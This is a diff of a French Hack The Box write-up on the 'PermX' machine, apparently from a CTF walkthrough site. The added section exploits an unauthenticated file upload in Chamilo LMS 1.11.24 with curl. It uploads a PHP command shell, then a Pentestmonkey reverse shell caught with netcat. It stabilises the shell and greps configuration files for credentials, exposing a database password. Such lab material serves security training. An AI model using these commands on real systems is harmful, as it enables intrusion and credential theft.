@@ -528,7 +528,7 @@ Port 80 (http)
 
 Les résultats de `mon-nmap` et `mon-subdomains` te conduisent naturellement vers l’application e-learning accessible sur `lms.permx.htb`. Avant toute tentative d’exploitation, tu lances donc un `mon-recoweb` ciblé sur ce virtual host, afin d’identifier les pages, répertoires et fonctionnalités susceptibles de mener à un premier point d’appui.
 
-#### Énumération web de lms.permx.htb avec mon-recoweb
+### Énumération web de lms.permx.htb avec mon-recoweb
 
 Avant toute tentative d’exploitation, tu commences par analyser l’application e-learning via un `mon-recoweb` sur `lms.permx.htb`, ce qui te permet d’obtenir une vue claire de sa structure interne et des fonctionnalités accessibles.
 
@@ -676,7 +676,7 @@ http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)
 
 À la lecture des résultats de `mon-recoweb`, tu observes une application PHP bien structurée, exposant de nombreux répertoires fonctionnels (`/app`, `/main`, `/plugin`, `/vendor`, `/src`) et plusieurs fichiers accessibles directement depuis le web. Ces éléments indiquent un LMS complet, dans lequel l’exploitation va probablement nécessiter une analyse des mécanismes d’authentification et des fonctionnalités internes.
 
-#### Identification de la version de Chamilo
+### Identification de la version de Chamilo
 
 Tu poursuis ensuite l’énumération de manière manuelle en explorant l’interface via le navigateur, avec un focus sur `/documentation` et plus particulièrement la page `changelog.html`.
 
@@ -690,7 +690,7 @@ Tu poursuis ensuite l’énumération de manière manuelle en explorant l’inte
 
 En consultant le changelog, tu confirmes que le LMS en place est ***Chamilo 1.11.24 (Beersel)***, ce qui te permet désormais de cibler des vulnérabilités connues associées à cette version.
 
-#### Recherche des vulnérabilités
+### Recherche des vulnérabilités
 
 
 
@@ -711,7 +711,7 @@ Shellcodes: No Results
 
 **La recherche de vulnérabilités avec `searchsploit` met en évidence un exploit de *Remote Code Execution* spécifiquement applicable à *Chamilo 1.11.24*, confirmant l’existence d’une piste d’exploitation directe.**
 
-#### Analyse de l’exploit Chamilo 1.11.24
+### Analyse de l’exploit Chamilo 1.11.24
 
 Après avoir identifié un exploit public correspondant à la version *Chamilo 1.11.24*, tu le télécharges avec `searchsploit -m` pour comprendre son fonctionnement avant de l’utiliser.
 
@@ -799,35 +799,253 @@ if __name__ == "__main__":
     execute_command(shell_url, args.cmd)
 ```
 
-Cet exploit cible **Chamilo LMS 1.11.24** et repose sur une **vulnérabilité d’upload de fichiers non restreint**, exploitable **sans authentification**. Le principe général est de profiter d’un mécanisme d’upload mal sécurisé pour déposer un fichier PHP arbitraire sur le serveur, puis de l’exécuter directement via le navigateur.
+En analysant l’exploit `52083.py`, tu commences par regarder la fonction `upload_shell`, qui envoie un fichier vers le serveur **Chamilo LMS 1.11.24**. Tu constates que l’application accepte des fichiers via une simple requête HTTP, sans aucune authentification.
 
-Le script envoie un web shell PHP minimal vers l’endpoint `bigUpload.php`, utilisé par Chamilo pour la gestion des fichiers. En l’absence de contrôle suffisant sur le type ou le contenu du fichier envoyé, l’upload est accepté et le fichier est stocké dans le répertoire accessible depuis le web :
+Le fichier est transmis dans le champ `bigUploadFile`, puis automatiquement enregistré dans le répertoire `/main/inc/lib/javascript/bigupload/files/`. Comme ce dossier est accessible depuis le navigateur, le fichier PHP uploadé peut être appelé directement via HTTP et exécuté par le serveur. Cela permet d’exécuter des commandes sur la machine cible et de valider l’accès initial sous l’utilisateur `www-data`.
 
-```
-/main/inc/lib/javascript/bigupload/files/
-```
+Cette analyse montre que l’exploit permet une exécution de commandes à distance sans authentification. Tu le démontres d’abord avec un Proof of Concept simple en exécutant la commande `id`, avant d’utiliser cette primitive pour obtenir un reverse shell et poursuivre l’exploitation.
 
-Une fois le fichier en place, l’exploit appelle ce web shell avec un paramètre `cmd`. Celui-ci est directement passé à la fonction `system()` de PHP, ce qui permet d’exécuter des commandes arbitraires sur la machine cible avec les droits du service web.
+### Proof of Concept — Validation de la RCE avec `id`
 
-**Cette analyse confirme que l’exploit permet une exécution de commandes à distance sans authentification ; nous allons le démontrer dans un Proof of Concept simple en exécutant la commande `id`, avant d’exploiter cette primitive pour obtenir un reverse shell et poursuivre l’exploitation.**
-
-
-
-#### Proof of Concept — Validation de la RCE avec `id`
-
-Pour valider concrètement l’exécution de commandes à distance, tu commences par un Proof of Concept simple en exécutant la commande `id`, ce qui permet de confirmer le contexte d’exécution côté serveur avant d’aller plus loin.
+Pour valider concrètement l’exécution de code à distance, tu commences par créer un fichier PHP très simple contenant une seule commande système. L’objectif est uniquement de vérifier si le code PHP est bien exécuté côté serveur.
 
 ```bash
-python3 52083.py http://lms.permx.htb/ id
+echo '<?php system("id"); ?>' > rce.php
+```
 
-[+] File uploaded successfully!
-[+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=
-[+] Command Output:
+Ce fichier contient une instruction PHP qui exécute la commande `id`, suffisante pour identifier l’utilisateur sous lequel le code s’exécute.
+
+Tu uploades ensuite ce fichier à l’aide d’une requête `curl -F`, en utilisant le champ `bigUploadFile` attendu par l’application. L’option `@rce.php` indique à `curl` d’envoyer le contenu du fichier, comme lors d’un upload via un formulaire web.
+
+```bash
+curl -F 'bigUploadFile=@rce.php' \
+'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+```
+
+```bash
+The file has successfully been uploaded. 
+```
+
+
+
+Le message *“The file has successfully been uploaded.”* confirme que le serveur accepte l’upload sans authentification et sans filtrage sur l’extension du fichier.
+
+Une fois l’upload effectué, tu accèdes directement au fichier PHP via son emplacement dans le répertoire d’upload, accessible depuis le navigateur.
+
+```bash
+curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
+```
+
+```bash
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
+
+La réponse renvoyée par le serveur affiche le résultat de la commande `id`, ce qui confirme que le fichier PHP est bien interprété et exécuté côté serveur. La commande s’exécute sous l’utilisateur `www-data`, correspondant au compte du serveur web. Cette sortie valide l’exécution de commandes à distance sans authentification et fournit un point d’appui suffisant pour passer à l’obtention d’un reverse shell.
+
+
+
+### Obtention du Reverse Shell
+
+La RCE étant confirmée, l’étape suivante consiste à obtenir un accès interactif via un reverse shell. Comme **Chamilo** est une application écrite en **PHP**, il est logique d’utiliser un **payload PHP** pour rester dans le même contexte d’exécution.
+
+Pour cela, tu choisis le reverse shell **Pentestmonkey**, un payload PHP classique et éprouvé en CTF, disponible sur *revshells.com* ou directement sur le dépôt officiel GitHub. Il suffit de le récupérer, 
+
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+puis d’adapter le début du fichier avec ton adresse IP tun0 et le port d’écoute avant de l’utiliser.
+
+```php
+ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+```
+
+Une fois le payload PHP prêt et adapté avec ton adresse IP et le port d’écoute, tu peux l’uploader de la même manière que lors du Proof of Concept. L’endpoint vulnérable accepte toujours les fichiers envoyés via le champ `bigUploadFile`, ce qui permet d’envoyer le reverse shell PHP sans authentification.
+
+```bash
+curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
+```
+
+Avant de déclencher l’exécution du reverse shell, tu dois mettre en place un **listener** sur ta machine afin de recevoir la connexion entrante depuis la cible. Pour cela, tu ouvres un terminal Kali et tu lances `netcat` en écoute sur le port configuré dans le payload PHP.
+
+```
+nc -lvnp 4444
+```
+
+Pour déclencher l’exécution du reverse shell, il suffit d’accéder au fichier PHP uploadé depuis son emplacement dans le répertoire d’upload. Cette action peut se faire directement via le navigateur ou à l’aide d’une requête `curl`, comme ci-dessous :
+
+```bash
+curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'
+```
+
+Lorsque cette requête est exécutée, le serveur interprète le fichier PHP et initie la connexion inverse vers ta machine.
+
+```bash
+nc -lvnp 4444             
+Listening on 0.0.0.0 4444
+Connection received on 10.129.76.139 37198
+Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 09:55:11 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$  whoami
+www-data
+$
+```
+
+
+
+### Consolidation du Shell
+
+Une fois le reverse shell obtenu, il est recommandé de le stabiliser afin de travailler plus confortablement. Cette étape permet d’obtenir un shell interactif plus fiable, avec une meilleure gestion du clavier et des commandes.
+
+Pour cette phase, tu peux t’appuyer sur la recette dédiée :
+ {{< recette "stabiliser-reverse-shell" >}}
+
+Elle décrit un technique classique pour consolider un reverse shell et préparer la suite de l’exploitation dans de bonnes conditions.
+
+```bash
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@permx:/$ 
+
+www-data@permx:/$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                                                       
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+                               export TERM=xterm 
+www-data@permx:/$ stty cols 132 rows 34
+www-data@permx:/$ 
+```
+
+
+
+```bash
+find /var/www/chamilo -type f \( \
+  -iname "configuration.php" -o \
+  -iname "config*.php" -o \
+  -iname "*.env" \
+\) -exec grep -nHiE "password|passwd|db_|secret|token" {} + 2>/dev/null
 
 ```
 
-Le résultat de la commande `id` montre que les commandes sont exécutées en tant que `www-data`, l’utilisateur du serveur web. Cette sortie valide la RCE et te donne un point d’appui suffisant pour **passer à l’obtention d’un reverse shell**.
+
+
+```bash
+/var/www/chamilo/main/install/configuration.dist.php:17:$_configuration['db_host'] = '{DATABASE_HOST}';
+/var/www/chamilo/main/install/configuration.dist.php:18:$_configuration['db_port'] = '{DATABASE_PORT}';
+/var/www/chamilo/main/install/configuration.dist.php:20:$_configuration['db_user'] = '{DATABASE_USER}';
+/var/www/chamilo/main/install/configuration.dist.php:21:$_configuration['db_password'] = '{DATABASE_PASSWORD}';
+/var/www/chamilo/main/install/configuration.dist.php:23:$_configuration['db_manager_enabled'] = false;
+/var/www/chamilo/main/install/configuration.dist.php:62:        'longTermAuthenticationRequestTokenUsed',
+/var/www/chamilo/main/install/configuration.dist.php:162:// Security word for password recovery
+/var/www/chamilo/main/install/configuration.dist.php:165:$_configuration['password_encryption'] = '{ENCRYPT_PASSWORD}';
+/var/www/chamilo/main/install/configuration.dist.php:166:// Set to true to allow automated password conversion after login if
+/var/www/chamilo/main/install/configuration.dist.php:167:// password_encryption has changed since last login. See GH#4063 for details.
+/var/www/chamilo/main/install/configuration.dist.php:168://$_configuration['password_conversion'] = false;
+/var/www/chamilo/main/install/configuration.dist.php:197://$_configuration['session_stored_in_db_as_backup'] = true;
+/var/www/chamilo/main/install/configuration.dist.php:294://$_configuration['sync_db_with_schema'] = false;
+/var/www/chamilo/main/install/configuration.dist.php:341:// Customize password generation and verification
+/var/www/chamilo/main/install/configuration.dist.php:343:/*$_configuration['password_requirements'] = [
+/var/www/chamilo/main/install/configuration.dist.php:351:    'force_different_password' => false,
+/var/www/chamilo/main/install/configuration.dist.php:1044:// Send two emails when creating a user. One with the username other with the password.
+/var/www/chamilo/main/install/configuration.dist.php:1154:// Disable token verification when sending a message
+/var/www/chamilo/main/install/configuration.dist.php:1155:// $_configuration['disable_token_in_new_message'] = false;
+/var/www/chamilo/main/install/configuration.dist.php:1250:// Validate user login via a webservice, Chamilo will send a "login" and "password" parameters
+/var/www/chamilo/main/install/configuration.dist.php:1573:        'wget_password' => '',
+/var/www/chamilo/main/install/configuration.dist.php:1624://        'client_secret' => '',
+/var/www/chamilo/main/install/configuration.dist.php:1625://        'access_token' => '',
+/var/www/chamilo/main/install/configuration.dist.php:1697:// Use this link as the "Forgot password?" link instead of the default. This setting should be transformed into a hook for plugins at a later time
+/var/www/chamilo/main/install/configuration.dist.php:1819:// Show/Hide password field in user profile. Adds a customizable link depending on the user status.
+/var/www/chamilo/main/install/configuration.dist.php:1821:$_configuration['auth_password_links'] = [
+/var/www/chamilo/main/install/configuration.dist.php:1825:                'show_password_field' => false,
+/var/www/chamilo/main/install/configuration.dist.php:1829:                'show_password_field' => true,
+/var/www/chamilo/main/install/configuration.dist.php:2203:// Ask user to renew password at first login.
+/var/www/chamilo/main/install/configuration.dist.php:2204:// Requires a user checkbox extra field called "ask_new_password".
+/var/www/chamilo/main/install/configuration.dist.php:2205://$_configuration['force_renew_password_at_first_login'] = true;
+/var/www/chamilo/main/install/configuration.dist.php:2374:// Add the "remember password" link to the "subscription to session" confirmation email
+/var/www/chamilo/main/install/configuration.dist.php:2375://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
+/var/www/chamilo/main/admin/configure_extensions.php:47:                    selected_value="'.addslashes($_POST['ftp_password']).'"
+/var/www/chamilo/main/admin/configure_extensions.php:49:                    AND subkey="ftp_password"';
+/var/www/chamilo/main/admin/configure_extensions.php:172:                    $form->addElement('text', 'ftp_password', get_lang('FtpPassword'));
+/var/www/chamilo/main/admin/configure_homepage.php:1066:                                    <input type="password" id="password" class="form-control" value=""
+/var/www/chamilo/main/admin/configure_homepage.php:1075:                                <li><?php echo api_ucfirst(get_lang('LostPassword')); ?></li>
+/var/www/chamilo/main/admin/configure_inscription.php:222:    //	PASSWORD
+/var/www/chamilo/main/admin/configure_inscription.php:223:    $form->addElement('password', 'pass1', get_lang('Pass'), ['size' => 40, 'disabled' => 'disabled']);
+/var/www/chamilo/main/admin/configure_inscription.php:224:    $form->addElement('password', 'pass2', get_lang('Confirmation'), ['size' => 40, 'disabled' => 'disabled']);
+/var/www/chamilo/main/admin/configure_inscription.php:228:    $form->addPasswordRule('pass1');
+/var/www/chamilo/main/admin/configure_inscription.php:348:    // Version and language //password
+/var/www/chamilo/app/config/configuration.php:17:$_configuration['db_host'] = 'localhost';
+/var/www/chamilo/app/config/configuration.php:18:$_configuration['db_port'] = '3306';
+/var/www/chamilo/app/config/configuration.php:20:$_configuration['db_user'] = 'chamilo';
+/var/www/chamilo/app/config/configuration.php:21:$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
+/var/www/chamilo/app/config/configuration.php:23:$_configuration['db_manager_enabled'] = false;
+/var/www/chamilo/app/config/configuration.php:62:        'longTermAuthenticationRequestTokenUsed',
+/var/www/chamilo/app/config/configuration.php:162:// Security word for password recovery
+/var/www/chamilo/app/config/configuration.php:165:$_configuration['password_encryption'] = 'bcrypt';
+/var/www/chamilo/app/config/configuration.php:166:// Set to true to allow automated password conversion after login if
+/var/www/chamilo/app/config/configuration.php:167:// password_encryption has changed since last login. See GH#4063 for details.
+/var/www/chamilo/app/config/configuration.php:168://$_configuration['password_conversion'] = false;
+/var/www/chamilo/app/config/configuration.php:197://$_configuration['session_stored_in_db_as_backup'] = true;
+/var/www/chamilo/app/config/configuration.php:294://$_configuration['sync_db_with_schema'] = false;
+/var/www/chamilo/app/config/configuration.php:341:// Customize password generation and verification
+/var/www/chamilo/app/config/configuration.php:343:/*$_configuration['password_requirements'] = [
+/var/www/chamilo/app/config/configuration.php:351:    'force_different_password' => false,
+/var/www/chamilo/app/config/configuration.php:1044:// Send two emails when creating a user. One with the username other with the password.
+/var/www/chamilo/app/config/configuration.php:1154:// Disable token verification when sending a message
+/var/www/chamilo/app/config/configuration.php:1155:// $_configuration['disable_token_in_new_message'] = false;
+/var/www/chamilo/app/config/configuration.php:1250:// Validate user login via a webservice, Chamilo will send a "login" and "password" parameters
+/var/www/chamilo/app/config/configuration.php:1573:        'wget_password' => '',
+/var/www/chamilo/app/config/configuration.php:1624://        'client_secret' => '',
+/var/www/chamilo/app/config/configuration.php:1625://        'access_token' => '',
+/var/www/chamilo/app/config/configuration.php:1697:// Use this link as the "Forgot password?" link instead of the default. This setting should be transformed into a hook for plugins at a later time
+/var/www/chamilo/app/config/configuration.php:1819:// Show/Hide password field in user profile. Adds a customizable link depending on the user status.
+/var/www/chamilo/app/config/configuration.php:1821:$_configuration['auth_password_links'] = [
+/var/www/chamilo/app/config/configuration.php:1825:                'show_password_field' => false,
+/var/www/chamilo/app/config/configuration.php:1829:                'show_password_field' => true,
+/var/www/chamilo/app/config/configuration.php:2203:// Ask user to renew password at first login.
+/var/www/chamilo/app/config/configuration.php:2204:// Requires a user checkbox extra field called "ask_new_password".
+/var/www/chamilo/app/config/configuration.php:2205://$_configuration['force_renew_password_at_first_login'] = true;
+/var/www/chamilo/app/config/configuration.php:2374:// Add the "remember password" link to the "subscription to session" confirmation email
+/var/www/chamilo/app/config/configuration.php:2375://$_configuration['email_template_subscription_to_session_confirmation_lost_password'] = false;
+/var/www/chamilo/plugin/ims_lti/configure.php:93:                    if (empty($formValues['consumer_key']) && empty($formValues['shared_secret'])) {
+/var/www/chamilo/plugin/ims_lti/configure.php:110:                            ->setSharedSecret($formValues['shared_secret']);
+/var/www/chamilo/plugin/ims_lti/configure.php:224:                        ->setSharedSecret($formValues['shared_secret']);
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:41:                ->scalarNode('db_driver')
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:68:                    return 'custom' === $v['db_driver'] && 'fos_user.user_manager.default' === $v['service']['user_manager'];
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:74:                    return 'custom' === $v['db_driver'] && !empty($v['group']) && 'fos_user.group_manager.default' === $v['group']['group_manager'];
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:80:        $this->addChangePasswordSection($rootNode);
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:170:                        ->scalarNode('token_ttl')->defaultValue(86400)->end()
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:191:                                    ->defaultValue(array('ResetPassword', 'Default'))
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:203:    private function addChangePasswordSection(ArrayNodeDefinition $node)
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:207:                ->arrayNode('change_password')
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:214:                                ->scalarNode('type')->defaultValue(Type\ChangePasswordFormType::class)->end()
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:215:                                ->scalarNode('name')->defaultValue('fos_user_change_password_form')->end()
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:218:                                    ->defaultValue(array('ChangePassword', 'Default'))
+/var/www/chamilo/vendor/friendsofsymfony/user-bundle/DependencyInjection/Configuration.php:240:                            ->scalarNode('token_generator')->defaultValue('fos_user.util.token_generator.default')->end()
+/var/www/chamilo/vendor/symfony/http-kernel/Tests/DataCollector/ConfigDataCollectorTest.php:36:        $this->assertNull($c->getToken());
+/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:63:            'token' => $response->headers->get('X-Debug-Token'),
+/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:100:     * Gets the token.
+/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:102:     * @return string The token
+/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:104:    public function getToken()
+/var/www/chamilo/vendor/symfony/http-kernel/DataCollector/ConfigDataCollector.php:106:        return $this->data['token'];
+/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:22:        $config = $processor->processConfiguration(new Configuration(true), array(array('secret' => 's3cr3t')));
+/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:25:            array_merge(array('secret' => 's3cr3t', 'trusted_hosts' => array()), self::getBundleDefaultConfig()),
+/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:51:            'secret' => 's3cr3t',
+/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:82:                'secret' => 's3cr3t',
+/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:97:                'secret' => 's3cr3t',
+/var/www/chamilo/vendor/symfony/framework-bundle/Tests/DependencyInjection/ConfigurationTest.php:134:                    'field_name' => '_token',
+/var/www/chamilo/vendor/symfony/framework-bundle/DependencyInjection/Configuration.php:55:                ->scalarNode('secret')->end()
+/var/www/chamilo/vendor/symfony/framework-bundle/DependencyInjection/Configuration.php:147:                                ->scalarNode('field_name')->defaultValue('_token')->end()
+
+```
+
+
 
 ---
 
